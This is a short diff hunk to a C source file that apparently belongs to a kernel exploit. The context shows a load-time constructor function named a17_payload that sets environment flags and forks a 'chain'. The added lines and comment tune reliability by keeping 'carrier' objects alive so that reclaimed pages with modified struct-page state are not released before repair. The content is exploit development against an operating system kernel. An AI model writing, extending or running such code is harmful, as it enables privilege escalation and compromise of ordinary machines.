@@ -76,6 +76,11 @@ __attribute__((constructor)) static void a17_payload(void) {
     _exit(1);
   }
   setenv("GL_WQ_UMH", "1", 1);
+  /* A missed rwforge owner scan may still leave the round's reclaimed page
+   * with modified struct-page state.  Keep each carrier alive across retry
+   * rounds so prepare_kernel_page() cannot release it before the channel is
+   * available to repair the tracked pages. */
+  setenv("GL_DEFER_CLOSE", "1", 1);
 
   pid_t chain = fork();
   if (chain < 0) {
